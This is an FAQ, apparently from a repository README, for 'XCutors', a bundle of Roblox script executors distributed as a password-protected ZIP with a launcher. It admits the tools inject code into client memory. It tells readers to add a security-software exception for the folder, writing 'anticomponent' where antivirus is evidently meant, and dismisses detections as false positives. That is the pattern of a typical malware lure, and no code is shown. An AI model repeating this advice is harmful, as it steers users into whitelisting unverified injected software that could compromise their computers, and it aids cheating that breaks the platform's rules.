## FAQ

### Is this package safe to use?

The tools are scanned before packaging, but all executors modify Roblox client memory. You assume all risk, including potential account action, when using any script execution software.

### Why are there multiple executors included?

Different executors have varying strengths, update frequencies, and script compatibility. This collection lets you choose the best tool for the specific script you want to run.

### What is the password for the ZIP file?

The extraction password is clearly listed in the repository's main README.md file. It is provided to ensure users have read the instructions and disclaimers.

### Do I need to disable my anticomponent?

Some anticomponent software may flag these tools as false positives due to their code injection nature. You may need to add an exception for the XCutors folder to run them smoothly.

### How often is the package updated?

Updates are pushed as soon as new stable versions of any included executor are released or to patch major compatibility issues with Roblox updates.

### Can I use this on Mac or Linux?

No. This package and all included executors are built exclusively for the Windows operating system and require a Windows 10/11 desktop environment.

### Where do I get scripts to run?

Scripts are third-party Lua code found on various community websites and forums. XCutors only provides the execution environment; you must source scripts independently.

### What does the universal loader do?

The xcutorsLoader acts as a manager that can launch any of the included executors from a single interface, remembering your settings and last-used tools.
